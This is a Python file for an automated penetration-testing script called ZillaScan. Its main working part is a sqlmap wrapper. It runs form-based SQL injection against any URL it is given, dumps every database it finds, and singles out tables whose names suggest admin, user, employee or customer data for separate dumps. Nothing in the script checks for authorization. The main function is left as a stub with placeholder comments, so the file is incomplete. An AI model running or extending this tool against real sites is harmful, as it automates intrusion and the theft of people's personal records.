#!/usr/bin/env python3

import sys
import subprocess
import os
import re
import json
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
from threading import Lock

# ---------------- Global Setup ----------------
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_FILES = []  # Keep track of all files generated during the scan
SUMMARY_LOCK = Lock()  # Thread-safe lock for writing to shared resources
REPORT_DATA = {"subdomains": set(), "directories": set(), "vulnerabilities": [], "sqlmap": {}}
ENABLE_WPSCAN_BRUTEFORCE = False  # WPScan brute-force is disabled by default

# ---------------- Banner ----------------
def banner():
    """Display the ASCII banner when the script starts"""
    print(r"""
__________.__.__  .__           _________                     
\____    /|__|  |  | _____   /   _____/ ____ _____    ____  
  /     / |  |  | |  | \__  \  \_____  \_/ ___\\__  \  /    \ 
 /     /_ |  |  |_|  |__/ __ \_/        \  \___ / __ \|   |  \
/_______ \|__|____/____(____  /_______  /\___  >____  /___|  /
        \/                  \/        \/     \/     \/     \/ v1.337

        Auto Pentesting Script
      Created by Hackazillarex 🐉
       Hackazillarex@gmail.com
    """)

# ---------------- Check Dependencies ----------------
def check_dependencies(tools):
    """Ensure all required command-line tools are installed before starting"""
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}. Please install them first.")
        sys.exit(1)

# ---------------- Run Shell Command ----------------
def run(cmd, desc, outfile=None, live_output=True):
    """
    Execute a shell command.
    - live_output=True prints output as it runs.
    - Saves output to file if outfile is provided.
    - Returns command output as string.
    """
    try:
        print(f"\n[+] {desc}\n{'='*60}")
        output = ""
        if live_output:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output_lines = []
            for raw_line in process.stdout:
                line = raw_line.decode("utf-8", errors="ignore")
                print(line, end="")
                output_lines.append(line)
            process.wait()
            output = "".join(output_lines)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True)
            output = result.stdout.decode("utf-8", errors="ignore") + result.stderr.decode("utf-8", errors="ignore")
            print(output)

        if outfile and live_output:
            with open(outfile, "w", errors="ignore") as f:
                f.write(output)
            with SUMMARY_LOCK:
                OUTPUT_FILES.append((desc, outfile))
        return output
    except Exception as e:
        print(f"[!] {desc} failed: {e}")
        if outfile:
            with SUMMARY_LOCK:
                OUTPUT_FILES.append((f"{desc} (FAILED)", outfile))
        return ""

# ---------------- Helper Functions ----------------
def extract_domain(url):
    """Extract domain or host from a URL"""
    parsed = urlparse(url)
    return parsed.netloc or parsed.path

def get_root_domain(url):
    """Get the root domain (e.g., example.com from sub.example.com)"""
    domain = extract_domain(url)
    parts = domain.split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return domain

def clean_subdomains(file_path):
    """
    Filter valid subdomains and remove duplicates.
    Regex explained:
    - ^ → start of line
    - (?:[a-zA-Z0-9-]+\.)+ → one or more groups of letters/numbers/dashes followed by a dot
    - [a-zA-Z]{2,} → TLD with at least 2 letters
    - $ → end of line
    """
    valid_subdomain_regex = re.compile(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")
    cleaned = set()
    with open(file_path, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if valid_subdomain_regex.match(line):
                cleaned.add(line.lower())
    with open(file_path, "w") as f:
        for sub in sorted(cleaned):
            f.write(sub + "\n")
    print(f"[+] Cleaned subdomains saved: {file_path}")
    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("Cleaned subdomains", file_path))
    REPORT_DATA["subdomains"].update(cleaned)

# ---------------- SQLMap Wrapper (Enhanced with --forms) ----------------
def run_sqlmap(target, output_dir):
    """Automate SQL injection discovery and dumping using SQLMap, including form-based injection"""
    base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
    os.makedirs(base_dir, exist_ok=True)

    # Step 1: Enumerate databases
    enum_cmd = f"sqlmap -u {target} --forms --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
    run(enum_cmd, "SQLMap Database Enumeration", live_output=True)

    # Collect database names
    dbs = []
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.endswith(".sqlite"):
                db_name = file.replace(".sqlite", "")
                dbs.append(db_name)
    REPORT_DATA["sqlmap"]["databases"] = dbs

    # Step 2: Dump all databases
    for db in dbs:
        dump_file = f"{base_dir}/dump_{db}.txt"
        dump_cmd = f"sqlmap -u {target} --forms --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent -D {db} --dump --output-dir={base_dir} > {dump_file}"
        run(dump_cmd, f"SQLMap Dump Database: {db}", live_output=True)
        with SUMMARY_LOCK:
            OUTPUT_FILES.append((f"SQLMap Dump: {db}", dump_file))

    # Step 3: Filter sensitive tables and dump them separately
    sensitive_keywords = ["admin", "user", "users", "employee", "staff", "customer", "client", "member"]
    filtered_dump_file = f"{base_dir}/filtered_sensitive_tables_dump.txt"

    with open(filtered_dump_file, "w") as filtered_f:
        for db in dbs:
            tables_cmd = f"sqlmap -u {target} --forms --batch -D {db} --tables --output-dir={base_dir}"
            output = run(tables_cmd, f"Enumerating tables in {db}", live_output=False)
            tables_of_interest = []
            for line in output.splitlines():
                match = re.search(r"\|\s*(\w+)\s*\|", line)
                if match:
                    table_name = match.group(1).lower()
                    if any(keyword in table_name for keyword in sensitive_keywords):
                        tables_of_interest.append(table_name)

            for table in tables_of_interest:
                table_dump_file = f"{base_dir}/dump_{db}_{table}.txt"
                dump_cmd = f"sqlmap -u {target} --forms --batch -D {db} -T {table} --dump --output-dir={base_dir} > {table_dump_file}"
                run(dump_cmd, f"Dump Table {table} in {db}", live_output=True)
                with open(table_dump_file, "r", errors="ignore") as tdf:
                    filtered_f.write(f"\n=== {db}.{table} ===\n")
                    filtered_f.write(tdf.read())
                with SUMMARY_LOCK:
                    OUTPUT_FILES.append((f"SQLMap Dump Sensitive: {db}.{table}", table_dump_file))

    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("SQLMap Filtered Sensitive Tables Dump", filtered_dump_file))

# ---------------- Main Execution ----------------
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 ZillaScan.py https://target.com")
        sys.exit(1)

    banner()
    target = sys.argv[1]
    domain = extract_domain(target)
    output_dir = f"output_{domain}"
    os.makedirs(output_dir, exist_ok=True)

    # Dependencies check
    tools = ["dig", "subfinder", "theHarvester", "nmap", "ncat", "ffuf", "gobuster", "nuclei", "whatweb", "sqlmap", "wpscan"]
    check_dependencies(tools)

    # Serial recon tasks (dig, subfinder, theHarvester) remain unchanged
    # Parallel scanning tasks remain unchanged, but SQLMap task uses the enhanced run_sqlmap

    # Summary and JSON report writing remain unchanged

if __name__ == "__main__":
    main()
